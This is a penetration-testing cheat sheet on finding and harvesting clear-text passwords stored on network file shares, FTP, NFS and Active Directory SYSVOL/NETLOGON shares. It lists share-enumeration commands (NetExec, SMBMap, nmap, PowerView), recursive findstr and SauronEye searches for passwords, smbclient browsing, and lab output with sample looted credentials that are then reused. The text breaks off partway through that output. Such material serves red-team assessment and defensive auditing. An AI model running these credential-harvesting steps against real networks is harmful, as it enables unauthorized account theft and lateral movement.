========================================================================================================================================
Harvesting clear-text credentials insecurely hardcoded in files shared on network shares, FTP shares, etc.
========================================================================================================================================

During penetration tests and offensive security assessements, a common hacking strategy is to search across the internal network for files containing 
insecurely stored credentials. These can be files created by users to store their own credentials, shared credential stores for a group of individuals, 
configuration files and scripts containing passwords for a system or service, source code/binary files containing embedded passwords, etc.

The objective is to search for clear-text credentials in shared files on any systems we have access to (at least with read rights):
> Network file shares (SMB) 
> FTP shares
> TFTP shares
> NFS shares
> SharePoint sites
> Confluence sites
> Intranet sites
> Wiki sites
> Github / Gitlab
> Jira sites
> Domain shares (AD)
  + SYSVOL share
  + NETLOGON share
  + any mapped drives in AD

Passwords can be found in multiple types of files:
--------------------------------------------------
> Scripts (.ps1, .bat, .vbs, .sql, .py, ...)
> Configuration files (.config, .ini, .xml, ...)
> Note files (.txt, .one)
> Source codes
> Log files
> History files (e.g. powershell history)
> Backup files
> Office files (Word and Excel)
> PDF files (IT admin guides, procedures, etc.)
> VM files (.vmdk, .ova, etc.)
> ...

============================================================================================================================
Test/PoC 1 - Credentials harvesting from network file shares (SMB), FTP shares, TFTP shares, NFS shares [...]
============================================================================================================================

----------------------------------------------------------------------------------------------------------------------------
STEP 1 - Enumerate network file shares (SMB), FTP shares, TFTP shares, NFS shares [...]
----------------------------------------------------------------------------------------------------------------------------

-------------------------------------------------
1.1. NetExec (network service exploitation tool)
-------------------------------------------------

=> https://github.com/Pennyw0rth/NetExec

a) Enumerate permissions on all network file shares (SMB)
----------------------------------------------------------
    > nxc smb X.X.X.X/24 -u user -p 'PASSWORDHERE' --shares
      or
    > nxc smb X.X.X.X/24 -u user -p 'PASSWORDHERE' --shares READ

    Examples
    --------

    ┌──(kali㉿kali)-[~]
    └─$ nxc smb 192.168.1.11-17 -u lowprivuser -p 'SuperToto1234' --shares
    SMB         192.168.1.11    445    SERVER-WIN2022   [*] Windows Server 2022 Build 20348 x64 (name:SERVER-WIN2022) (domain:Server-Win2022) (signing:False) (SMBv1:False)
    SMB         192.168.1.11    445    SERVER-WIN2022   [-] Server-Win2022\lowprivuser:SuperToto1234 STATUS_LOGON_FAILURE
    SMB         192.168.1.17    445    DOMAINCONTROLLE  [*] Windows Server 2022 Build 20348 x64 (name:DOMAINCONTROLLE) (domain:lab.local) (signing:True) (SMBv1:False)
    SMB         192.168.1.17    445    DOMAINCONTROLLE  [+] lab.local\lowprivuser:SuperToto1234
    SMB         192.168.1.17    445    DOMAINCONTROLLE  [*] Enumerated shares
    SMB         192.168.1.17    445    DOMAINCONTROLLE  Share           Permissions     Remark
    SMB         192.168.1.17    445    DOMAINCONTROLLE  -----           -----------     ------
    SMB         192.168.1.17    445    DOMAINCONTROLLE  ADMIN$                          Remote Admin
    SMB         192.168.1.17    445    DOMAINCONTROLLE  C$                              Default share
    SMB         192.168.1.17    445    DOMAINCONTROLLE  IPC$            READ            Remote IPC
    SMB         192.168.1.17    445    DOMAINCONTROLLE  NETLOGON        READ            Logon server share
    SMB         192.168.1.17    445    DOMAINCONTROLLE  SYSVOL          READ            Logon server share
    Running nxc against 7 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00

    ┌──(kali㉿kali)-[~]
    └─$ nxc smb 192.168.1.11-17 -u auditor -p 'SuperToto1234' --shares
    SMB         192.168.1.11    445    SERVER-WIN2022   [*] Windows Server 2022 Build 20348 x64 (name:SERVER-WIN2022) (domain:Server-Win2022) (signing:False) (SMBv1:False)
    SMB         192.168.1.17    445    DOMAINCONTROLLE  [*] Windows Server 2022 Build 20348 x64 (name:DOMAINCONTROLLE) (domain:lab.local) (signing:True) (SMBv1:False)
    SMB         192.168.1.11    445    SERVER-WIN2022   [+] Server-Win2022\auditor:SuperToto1234 (Pwn3d!)
    SMB         192.168.1.17    445    DOMAINCONTROLLE  [-] lab.local\auditor:SuperToto1234 STATUS_ACCOUNT_RESTRICTION
    SMB         192.168.1.11    445    SERVER-WIN2022   [*] Enumerated shares
    SMB         192.168.1.11    445    SERVER-WIN2022   Share           Permissions     Remark
    SMB         192.168.1.11    445    SERVER-WIN2022   -----           -----------     ------
    SMB         192.168.1.11    445    SERVER-WIN2022   ADMIN$          READ,WRITE      Remote Admin
    SMB         192.168.1.11    445    SERVER-WIN2022   C$              READ,WRITE      Default share
    SMB         192.168.1.11    445    SERVER-WIN2022   IPC$            READ            Remote IPC
    Running nxc against 7 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00


b) Identify open network shares (accessible without authentication)
-------------------------------------------------------------------
    > nxc smb 10.0.0.4 -u guest -p '' --get-file \\info.txt.txt infos.txt.txt  --share OPENSHARE
      or
    > nxc smb 10.0.0.4 -u guest -p '' -M spider_plus

    Example
    -------

    ┌──(kali㉿kali)-[~]
    └─$ nxc smb 192.168.1.11-17 -u guest -p '' -M spider_plus
    SMB         192.168.1.11    445    SERVER-WIN2022   [*] Windows Server 2022 Build 20348 x64 (name:SERVER-WIN2022) (domain:Server-Win2022) (signing:False) (SMBv1:False)
    SMB         192.168.1.17    445    DOMAINCONTROLLE  [*] Windows Server 2022 Build 20348 x64 (name:DOMAINCONTROLLE) (domain:lab.local) (signing:True) (SMBv1:False)
    SMB         192.168.1.11    445    SERVER-WIN2022   [-] Server-Win2022\guest: STATUS_ACCOUNT_DISABLED
    SMB         192.168.1.17    445    DOMAINCONTROLLE  [-] lab.local\guest: STATUS_ACCOUNT_DISABLED
    Running nxc against 7 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00


------------------------------------------------
1.2. SMBMap (SMB enumeration tool)
------------------------------------------------

=> https://github.com/ShawnDEvans/smbmap

SMBMap allows users to enumerate samba share drives across an entire domain. List share drives, drive permissions, share contents, upload/download functionality,
file name auto-download pattern matching, and even execute remote commands.
This tool was designed with pen testing in mind, and is intended to simplify searching for potentially sensitive data across large networks.

Examples
--------

┌──(kali㉿kali)-[~/Downloads/smbmap-1.10.7]
└─$ smbmap -H 192.168.1.11 -u 'auditor' -p 'SuperToto1234'

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB session(s)

[+] IP: 192.168.1.11:445        Name: 192.168.1.11              Status: ADMIN!!!
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  READ, WRITE     Remote Admin
        C$                                                      READ, WRITE     Default share
        IPC$                                                    READ ONLY       Remote IPC


┌──(kali㉿kali)-[~/Downloads/smbmap-1.10.7]
└─$ smbmap -H 192.168.1.254

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB session(s)

[+] IP: 192.168.1.254:445       Name: 192.168.1.254             Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        IPC$                                                    NO ACCESS       IPC share
        Share1	                                                READ, WRITE     AutoShare of fbxhdiskd partition 2


------------------------------------------------
1.3. PowerView's Invoke-ShareFinder
------------------------------------------------

=> https://github.com/darkoperator/Veil-PowerView/blob/master/PowerView/functions/Invoke-ShareFinder.ps1

Use the script 'Invoke-ShareFinder.ps1' to enumerate the list of non-default shares that the current user account has at least read access to:

PS C:\> Invoke-ShareFinder -domain lab.local -ExcludeStandard -CheckShareAccess

\\DC01.lab.local\NETLOGON      		- Logon server share
\\DC01.lab.local\SYSVOL        		- Logon server share
\\WinServer01.lab.local\Share       	-
\\WinServer01.lab.local\temp       	-
\\WinServer02.lab.local\backup$     	-
<SNIP>


------------------------------------------------
1.4. NMAP scanner
------------------------------------------------

SMB file shares
---------------
> nmap -Pn -sV -sS -p 445 --script smb-enum-shares.nse  <target host>
> sudo nmap -sU -sS -p U:137,T:139 --script smb-enum-shares.nse  <target host>

FTP shares
----------
> nmap -Pn -sV -sS -p 21 <target host>
> nmap -sV -p 21 --script ftp-anon <target host>

NFS shares
----------
> nmap -Pn -sV -sS -p 111 <target host>
> nmap -sV --script=nfs-showmount <target host>

TFTP shares
-----------
> nmap -Pn -sV -sU -p 69 <target host>
> nmap -sU -p 69 --script tftp-enum.nse --script-args tftp-enum.filelist=customlist.txt <target host>


----------------------------------------------------------------------------------------------------------------------------
STEP 2 - Password looting in network file shares (SMB)
----------------------------------------------------------------------------------------------------------------------------

------------------------------------------------
2.1. FINDSTR (Windows native command)
------------------------------------------------

Below are examples of FINDSTR commands that can be helpful to find clear-text credentials across local files and network shares:

+ findstr /snip password \\networkfileshare\folder\*.txt
+ findstr /snip password \\networkfileshare\folder\*.xml
+ findstr /snip password \\networkfileshare\folder\*.ini
+ findstr /snip password \\networkfileshare\folder\*.config
+ findstr /snip password \\networkfileshare\folder\*.xlsx
+ findstr /snip password \\networkfileshare\folder\*.ps1
+ findstr /snip password \\networkfileshare\folder\*.bat
+ findstr /snip password \\networkfileshare\folder\*.cmd
+ findstr /snip password \\networkfileshare\folder\*.vbs
+ findstr /snip password \\networkfileshare\folder\*.sql
+ findstr /snip password \\networkfileshare\folder\*.sh
+ ...

Keywords to search with FINDSTR: password, pass, pwd, passwd, credential, creds, secret, key, token, net use, login, id, username, etc.

---------------
Example 1
---------------

C:\> findstr /S /I "password" "\\192.168.1.254\backup-share\*"

\\192.168.1.254\backup-share\Credentials.txt:local-admin-password=Sup3rpa$$
\\192.168.1.254\backup-share\Credentials.txt:login=dbadmin: & password=S@sql2025!!
\\192.168.1.254\backup-share\scripts\Create-User.bat:NET USER Batch-user password01! /ADD /DOMAIN
\\192.168.1.254\backup-share\scripts\Mount-File-Share.bat:net use Z: \\PRBCKsrv01\DC01\ password01! /user:SECURITY-LAB\Batch-user /persistent:yes
\\192.168.1.254\backup-share\website\Web.config:  <add name="MyConnectionString" connectionString="Data Source=DBserver01;Initial Catalog=ProdDatabase;User ID=SA;Password=AQZSERF0987!!" providerName="System.Data.SqlClient" />
<SNIP>


---------------
Example 2
---------------

C:\> findstr /S /I "net use" "\\nas01\share2\*.bat"

\\nas01\share2\IT\scripts\test.bat:3:net use o: \\10.133.228.30\data qJhgdqq123 /USER:svc_test /Persistent:YEs
\\nas01\share2\IT\scripts\test.bat:5:net use /delete x:
\\nas01\share2\IT\scripts\test.bat:6:net use x: \\10.133.245.14\files qJhgdqq123 /USER:svc_test /persistent:yes
\\nas01\share2\IT\config\audit.bat:3:net use /delete O:
\\nas01\share2\IT\config\audit.bat:4:net use o: \\10.133.228.30\data Super5#$a /USER:auditor /PERSISTENT:YES
\\nas01\share2\IT\config\audit.bat:7:net use /delete X:
\\nas01\share2\IT\config\audit.bat:8:net use X: \\10.133.245.14\files Super5#$a /USER:auditor /PERSISTENT:YES
<SNIP>


---------------
Example 3
---------------

C:\> runas /noprofile /netonly /user:LAB\LowPrivUser cmd
Enter the password for administrator:
Attempting to start cmd as user "LAB\LowPrivUser" ...

Microsoft Windows [Version 10.0.19045.6093]
(c) Microsoft Corporation. All rights reserved.

C:\> findstr /snip password "\\192.168.1.11\share01\*"

\\192.168.1.11\share01\Creds.txt:1:Login=admin; Password=Sup3rpa$$
\\192.168.1.11\share01\Web.config:  <add name="MyConnectionString" connectionString="Data Source=DBserver01;Initial Catalog=ProdDatabase;User ID=SA;Password=AQZSERF0987!!" providerName="System.Data.SqlClient" />
<SNIP>


------------------------------------------------
2.2. SauronEye
------------------------------------------------

> https://github.com/vivami/SauronEye

> SauronEye is a search tool built to aid red teams in finding files containing specific keywords (i.e. files containing passwords).
  Features:
  + Search multiple (network) drives
  + Search contents of files
  + Search contents of Microsoft Office files (.doc, .docx, .xls, .xlsx)
  + Find VBA macros in old 2003 .xls and .doc files
  + Search multiple drives multi-threaded for increased performance
  + Supports regular expressions in search keywords
  + Compatible with Cobalt Strike's execute-assembly

> Examples of keywords to search with SauronEye:
  + password, pass, pwd, passwd, credential, creds, secret, key, token, net use, login, id, username, etc.

> Examples of file types to search with SauronEye:
  + .txt .doc .docx .xls .xml .ini .bat .ps1 .vbs .sql .config, etc.

> Example of command:
  + SauronEye.exe -d "\\SOMENETWORKDRIVE\" --filetypes .txt .doc .docx .xls .bat .ps1 .config --contents --keywords password pass* -v

---------------
Example 1 
---------------

PS C:\temp> SauronEye.exe -d "\\192.168.1.11\c$\share\" --filetypes .txt .bat .ps1 .conf .docx --contents --keywords password pass*

         === SauronEye ===

Directories to search: \\192.168.1.11\c$\temp\
For file types: .txt, .bat, .ps1, .conf, .docx
Containing: password, pass*
Search contents: True
Search Office 2003 files for VBA: False
Max file size: 1024 KB
Search Program Files directories: False
Searching in parallel: \\192.168.1.11\c$\temp\
[*] Done searching file system, now searching contents
[+] \\192.168.1.11\c$\temp\Share\scripts\Create-User.bat:
         ...SER Batch-user password01! /ADD /DOMAI... ...SER Batch-user password01! /ADD /DO...

[+] \\192.168.1.11\c$\temp\Share\scripts\Mount-File-Share.bat:
         ...BCKsrv01\DC01\ password01! /user:SECUR... ...BCKsrv01\DC01\ password01! /user:SE...

[+] \\192.168.1.11\c$\temp\Share\Credentials.txt:
         ...local-admin-Password=Sup3rpa$$
log... ...gin=dbadmin: & password=S@sql2025!!... ...local-admin-Password=Sup3rpa$$
...

 Done. Time elapsed = 00:00:00.0209362


------------------------------------------------
2.3. SMBMap (SMB enumeration tool)
------------------------------------------------

SMBMap allows users to enumerate samba share drives across an entire domain. List share drives, drive permissions, share contents, upload/download functionality,
file name auto-download pattern matching, and even execute remote commands.
This tool was designed with pen testing in mind, and is intended to simplify searching for potentially sensitive data across large networks.

> Example of command to perfrom a 'Recursive Filename Pattern Search'

  $ ./smbmap.py -H 192.168.86.179 -u Administrator -p Password -r 'c$/program files' --depth 2 -A '(password|config)'


------------------------------------------------
2.4. SearchShares.ps1
------------------------------------------------

This script allows to search open file shares for potentially sensitive information such as password files, database backups, etc.

=> https://github.com/fashionproof/SearchOpenFileShares/blob/master/SearchShares.ps1


============================================================================================================================
Test/PoC 2 - Credentials harvesting from Domain Shares
============================================================================================================================

The objective of this 'attack' is to look for clear-text credentials that may be hardcoded in scripts and files stored on Domain shares:
> SYSVOL share
  - %SystemRoot%\SYSVOL\sysvol\<domain_name>\Policies
  - %SystemRoot%\SYSVOL\sysvol\<domain_name>\scripts
> NETLOGON share
> any mapped drives in AD

Often passwords can be found hardcoded in '.bat', '.ps1' and '.vbs' scripts and also in '.ini' and '.xml' configuration files.

--------------------------------------------------------------------------------------------------------------------------------------
STEP 1 - Check if you have access to the shares of the Domain Controller (by design it is the case for all 'Domain users')
--------------------------------------------------------------------------------------------------------------------------------------

Windows
--------
Simply try to browse the SYSVOL and NETLOGON shares with the Windows explorer (e.g. '\\security-test-lab.local\SYSVOL\' and '\\security-test-lab.local\NETLOGON\')
or start a PowerShell command prompt and use the 'LS' command (e.g. PS C:\Users\testuser> $ ls \\<domain name>\SYSVOL\).

Kali Linux
----------
jeff@kali:~/Documents/CTFs/BadBlood$ sudo crackmapexec smb 192.168.1.50 -u testuser -p Test1234 --shares
SMB         192.168.1.50    445    TEMP-DC          [*] Windows Server 2016 R2 Standard x64 (name:TEMP-DC) (domain:SECURITY-LAB) (signing:True) (SMBv1:True)
SMB         192.168.1.50    445    TEMP-DC          [+] SECURITY-LAB\testuser:Test1234 
SMB         192.168.1.50    445    TEMP-DC          [+] Enumerated shares
SMB         192.168.1.50    445    TEMP-DC          Share           Permissions     Remark
SMB         192.168.1.50    445    TEMP-DC          -----           -----------     ------
SMB         192.168.1.50    445    TEMP-DC          ADMIN$                          Remote Admin
SMB         192.168.1.50    445    TEMP-DC          C$                              Default share
SMB         192.168.1.50    445    TEMP-DC          IPC$                            Remote IPC
SMB         192.168.1.50    445    TEMP-DC          NETLOGON        READ            Logon server share 
SMB         192.168.1.50    445    TEMP-DC          SYSVOL          READ            Logon server share 


--------------------------------------------------------------------------------------------------------------------------------------
STEP 2 - Browse the domain shares and look for credentials stored in plain-text in scripts and files (.vbs, .ps1, .bat, .ini, .xml)
--------------------------------------------------------------------------------------------------------------------------------------

jeff@kali:~/Documents/CTFs/BadBlood$ smbclient \\\\192.168.1.50\\SYSVOL -U 'security-lab\\testuser'
Enter testuser's password: 
Try "help" to get a list of possible commands.

smb: \> dir
  .                                   D        0  Sat Apr 18 00:35:23 2020
  ..                                  D        0  Sat Apr 18 00:35:23 2020
  dJjaOtNApx                          D        0  Sat Apr 18 00:35:23 2020
  OyEUcVTpkm                          D        0  Wed Apr 15 12:28:52 2020
  Security-Test-Lab.Local             D        0  Wed Apr 15 08:59:43 2020

                8298495 blocks of size 4096. 5871956 blocks available
                
smb: \> cd dJjaOtNApx
smb: \dJjaOtNApx\> dir
  .                                   D        0  Sat Apr 18 00:35:23 2020
  ..                                  D        0  Sat Apr 18 00:35:23 2020

                8298495 blocks of size 4096. 5871956 blocks available
                
smb: \dJjaOtNApx\> cd ..
smb: \> cd Security-Test-Lab.Local
smb: \Security-Test-Lab.Local\> dir
  .                                   D        0  Wed Apr 15 09:01:07 2020
  ..                                  D        0  Wed Apr 15 09:01:07 2020
  DfsrPrivate                       DHS        0  Wed Apr 15 09:01:07 2020
  Policies                            D        0  Wed Apr 15 08:59:52 2020
  scripts                             D        0  Sat Apr 18 00:50:03 2020

                8298495 blocks of size 4096. 5871956 blocks available
                
smb: \Security-Test-Lab.Local\> cd scripts
smb: \Security-Test-Lab.Local\scripts\> dir
  .                                   D        0  Sat Apr 18 00:50:03 2020
  ..                                  D        0  Sat Apr 18 00:50:03 2020
  CreateUser.bat                      A      214  Sat Apr 18 01:43:54 2020
  Mount-Backupshare.bat               A      100  Sat Apr 18 00:45:06 2020

                8298495 blocks of size 4096. 5871956 blocks available


smb: \Security-Test-Lab.Local\scripts\> help
?              allinfo        altname        archive        backup         
blocksize      cancel         case_sensitive cd             chmod          
chown          close          del            deltree        dir            
du             echo           exit           get            getfacl        
geteas         hardlink       help           history        iosize         
lcd            link           lock           lowercase      ls             
l              mask           md             mget           mkdir          
more           mput           newer          notify         open           
posix          posix_encrypt  posix_open     posix_mkdir    posix_rmdir    
posix_unlink   posix_whoami   print          prompt         put            
pwd            q              queue          quit           readlink       
rd             recurse        reget          rename         reput          
rm             rmdir          showacls       setea          setmode        
scopy          stat           symlink        tar            tarmode        
timeout        translate      unlock         volume         vuid           
wdel           logon          listconnect    showconnect    tcon           
tdis           tid            utimes         logoff         ..             
!              
smb: \Security-Test-Lab.Local\scripts\> more CreateUser.bat
getting file \Security-Test-Lab.Local\scripts\CreateUser.bat of size 214 as /tmp/smbmore.zLHstn (104.5 KiloBytes/sec) (average 104.5 KiloBytes/sec)

	@echo off
	NET USER Batch-user password01! /ADD /DOMAIN
	NET GROUP "Domain Users" Batch-user /ADD
	NET LOCALGROUP "Replicator" Batch-user /ADD /DOMAIN
	NET LOCALGROUP "WinRMRemoteWMIUsers__" Batch-user /ADD /DOMAIN
	/tmp/smbmore.2N3JJ2 (END)


smb: \Security-Test-Lab.Local\scripts\> 

smb: \Security-Test-Lab.Local\scripts\> more Mount-Backupshare.bat
getting file \Security-Test-Lab.Local\scripts\Mount-Backupshare.bat of size 100 as /tmp/smbmore.wiq38b (48.8 KiloBytes/sec) (average 76.7 KiloBytes/sec)

	@echo off

	net use Z: \\PRBCKsrv01\DC01\ password01! /user:SECURITY-LAB\Batch-user /persistent:yes
	/tmp/smbmore.wiq38b (END)

--------------------------------------------------------------------------------------------------------------------------------------
Step 3 - Verify that the found credentials are still enabled and valid and use them for further attacks...
--------------------------------------------------------------------------------------------------------------------------------------

jeff@kali:~/Documents/CTFs/BadBlood$ crackmapexec smb 192.168.1.50 -u batch-user -p password01! --shares
SMB         192.168.1.50    445    TEMP-DC          [*] Windows Server 2016 R2 Standard x64 (name:TEMP-DC) (domain:SECURITY-LAB) (signing:True) (SMBv1:True)
SMB         192.168.1.50    445    TEMP-DC          [+] SECURITY-LAB\batch-user:password01! 
SMB         192.168.1.50    445    TEMP-DC          [+] Enumerated shares
SMB         192.168.1.50    445    TEMP-DC          Share           Permissions     Remark
SMB         192.168.1.50    445    TEMP-DC          -----           -----------     ------
SMB         192.168.1.50    445    TEMP-DC          ADMIN$                          Remote Admin
SMB         192.168.1.50    445    TEMP-DC          C$                              Default share
SMB         192.168.1.50    445    TEMP-DC          IPC$                            Remote IPC
SMB         192.168.1.50    445    TEMP-DC          NETLOGON        READ            Logon server share 
SMB         192.168.1.50    445    TEMP-DC
